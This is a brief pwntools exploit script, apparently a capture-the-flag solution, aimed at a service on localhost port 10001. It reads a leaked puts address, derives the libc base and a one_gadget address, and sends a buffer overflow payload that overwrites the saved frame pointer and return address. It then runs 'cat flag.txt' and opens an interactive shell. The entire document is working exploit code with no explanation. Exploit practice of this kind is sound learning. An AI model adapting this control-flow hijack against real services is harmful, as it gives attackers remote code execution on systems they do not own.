from pwn import *


p=remote("localhost",10001)
libc=ELF("./libc.so.6")

p.recvuntil("address of puts in libc : ")
leak=p.recvline()[:-1]  # remove newline
puts_address=int(leak,16)

#manually
puts_offset=0x0000000000080e50
libc_base=puts_address-puts_offset
onegadget_offset=0xebd43
onegadget=libc_base+onegadget_offset

#automated
#onegadget_offset=0xebd43
#puts_offset=libc.symbols["puts"] 
#libc.address=puts_address-puts_offset
#onegadget=libc.address+onegadget_offset


p.sendline(b"a"*0x10+p64(0x0000000000404800)+p64(onegadget)) # one_gadgets dont always work


p.sendline("cat flag.txt")



p.interactive()